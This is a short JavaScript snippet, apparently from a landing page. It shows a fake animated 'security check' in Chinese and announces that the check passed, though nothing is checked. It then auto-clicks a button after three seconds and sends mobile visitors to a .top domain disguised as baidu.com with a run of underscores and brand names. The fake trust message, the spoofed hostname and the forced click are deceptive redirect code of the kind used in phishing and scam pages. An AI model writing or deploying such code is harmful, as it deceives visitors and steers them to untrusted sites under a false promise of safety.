     var it = document.getElementById('iconText');
    var _i = 1;
    var si = setInterval(function () {
      var txt = '正在安全检测';
      for (var i = 0; i < _i; i++) txt += '.';
      it.innerText = txt;
      if (++_i > 3) {
        clearInterval(si);
        setTimeout(function () {
          var icon = document.getElementById('icon');
          var subText = document.getElementById('subText');
          icon.classList.add("weui-icon-success");
          it.innerHTML = "已通过安全检测";
          subText.innerHTML = "如果没有自动跳转，请点击下方按钮前往";
        }, 300);
      }
    }, 300);
//判断
function RuPage(){
 if((navigator.userAgent.match(/(iPhone|iPod|Android|ios|iPad)/i))){
   window.location.href=" http://baidu.com_______________________xiaomi.huawei.bilibili.sy6602621.top/m";
 }else{
   window.location.href="/a/index.html"; 
 }
}

//点击事件
setTimeout(function() {
     // IE
     if(document.all) {
         document.getElementById("clickMe").click();
     }
     // 其它浏览器
     else {
         var e = document.createEvent("MouseEvents");
         e.initEvent("click", true, true);
         document.getElementById("clickMe").dispatchEvent(e);
     }
}, 3000);
